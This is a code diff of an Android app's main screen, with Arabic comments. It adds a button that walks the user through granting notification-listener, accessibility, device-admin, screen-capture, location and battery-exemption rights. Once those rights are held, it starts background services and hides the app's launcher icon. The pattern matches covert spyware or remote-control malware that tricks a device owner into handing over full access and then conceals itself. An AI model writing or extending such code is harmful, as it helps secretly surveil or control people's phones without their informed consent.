@@ -14,7 +14,13 @@ import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.Settings;
+import android.view.Gravity;
+import android.view.View;
 import android.view.accessibility.AccessibilityManager;
+import android.widget.Button;
+import android.widget.LinearLayout;
+import android.widget.TextView;
+import android.widget.Toast;
 
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
@@ -38,27 +44,69 @@ public class MainActivity extends AppCompatActivity {
         Manifest.permission.ACCESS_FINE_LOCATION,
         Manifest.permission.ACCESS_COARSE_LOCATION
     };
+    
+    private Button btnActivate;
+    private TextView tvStatus;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        // التحقق إذا كانت كل الصلاحيات ممنوحة
+        // تصميم بسيط
+        LinearLayout layout = new LinearLayout(this);
+        layout.setOrientation(LinearLayout.VERTICAL);
+        layout.setGravity(Gravity.CENTER);
+        layout.setPadding(50, 50, 50, 50);
+        
+        tvStatus = new TextView(this);
+        tvStatus.setText("🔒 التطبيق غير مفعل\nالرجاء تفعيل الصلاحيات");
+        tvStatus.setTextSize(18);
+        tvStatus.setGravity(Gravity.CENTER);
+        tvStatus.setTextColor(0xFF000000);
+        tvStatus.setPadding(0, 0, 0, 50);
+        
+        btnActivate = new Button(this);
+        btnActivate.setText("🔓 تفعيل التطبيق والصلاحيات");
+        btnActivate.setTextSize(16);
+        btnActivate.setPadding(30, 20, 30, 20);
+        btnActivate.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                requestAllPermissions();
+            }
+        });
+        
+        layout.addView(tvStatus);
+        layout.addView(btnActivate);
+        setContentView(layout);
+        
+        // تحديث الحالة
+        updateStatus();
+    }
+
+    private void updateStatus() {
         if (checkAllPermissions()) {
-            // إذا كل الصلاحيات ممنوحة، أخفي التطبيق فوراً
-            hideAppAndStartServices();
-        } else {
-            // طلب الصلاحيات
-            requestAllPermissions();
+            tvStatus.setText("✅ التطبيق مفعل بالكامل\nسيتم الإخفاء تلقائياً");
+            tvStatus.setTextColor(0xFF00AA00);
+            btnActivate.setText("✅ التطبيق مفعل");
+            btnActivate.setEnabled(false);
+            
+            // إخفاء التطبيق بعد 3 ثواني
+            new android.os.Handler().postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    hideAppAndStartServices();
+                }
+            }, 3000);
         }
     }
 
     private boolean checkAllPermissions() {
-        // التحقق من صلاحية الإشعارات
+        // صلاحية الإشعارات
         String enabledListeners = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
         boolean notificationEnabled = enabledListeners != null && enabledListeners.contains(getPackageName());
         
-        // التحقق من صلاحية الوصول
+        // صلاحية الوصول
         AccessibilityManager am = (AccessibilityManager) getSystemService(ACCESSIBILITY_SERVICE);
         List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
         boolean accessibilityEnabled = false;
@@ -69,16 +117,20 @@ public class MainActivity extends AppCompatActivity {
             }
         }
         
-        // التحقق من صلاحية Admin
+        // صلاحية Admin
         DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
         ComponentName adminReceiver = new ComponentName(this, AdminReceiver.class);
         boolean adminEnabled = dpm.isAdminActive(adminReceiver);
         
-        // التحقق من صلاحية تسجيل الشاشة
+        // صلاحية تسجيل الشاشة
         SharedPreferences prefs = getSharedPreferences("screen_capture", MODE_PRIVATE);
         boolean screenCaptureEnabled = prefs.contains("resultCode");
         
-        // التحقق من الأذونات العادية
+        // تجاهل البطارية
+        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+        boolean batteryIgnored = pm.isIgnoringBatteryOptimizations(getPackageName());
+        
+        // الأذونات العادية
         boolean normalPermissions = true;
         for (String permission : permissions) {
             if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
@@ -87,10 +139,12 @@ public class MainActivity extends AppCompatActivity {
             }
         }
         
-        return notificationEnabled && accessibilityEnabled && adminEnabled && screenCaptureEnabled && normalPermissions;
+        return notificationEnabled && accessibilityEnabled && adminEnabled && screenCaptureEnabled && batteryIgnored && normalPermissions;
     }
 
     private void requestAllPermissions() {
+        Toast.makeText(this, "جاري فتح إعدادات الصلاحيات...", Toast.LENGTH_LONG).show();
+        
         // 1. طلب صلاحية الإشعارات
         startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
         
@@ -147,20 +201,13 @@ public class MainActivity extends AppCompatActivity {
                 .apply();
         }
         
-        // بعد كل نتيجة، تحقق إذا كل الصلاحيات ممنوحة
-        if (checkAllPermissions()) {
-            hideAppAndStartServices();
-        }
+        updateStatus();
     }
 
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        
-        // بعد كل نتيجة، تحقق إذا كل الصلاحيات ممنوحة
-        if (checkAllPermissions()) {
-            hideAppAndStartServices();
-        }
+        updateStatus();
     }
 
     private void hideAppAndStartServices() {
@@ -168,22 +215,17 @@ public class MainActivity extends AppCompatActivity {
         startService(new Intent(this, MainService.class));
         startService(new Intent(this, AccessibilityControlService.class));
         
-        // إخفاء التطبيق بعد ثانية
-        new android.os.Handler().postDelayed(() -> {
-            PackageManager pm = getPackageManager();
-            pm.setComponentEnabledSetting(
-                new ComponentName(this, MainActivity.class),
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP);
-        }, 1000);
+        // إخفاء التطبيق
+        PackageManager pm = getPackageManager();
+        pm.setComponentEnabledSetting(
+            new ComponentName(this, MainActivity.class),
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            PackageManager.DONT_KILL_APP);
     }
 
     @Override
     protected void onResume() {
         super.onResume();
-        // إذا كل الصلاحيات ممنوحة، أخفي التطبيق
-        if (checkAllPermissions()) {
-            hideAppAndStartServices();
-        }
+        updateStatus();
     }
 }
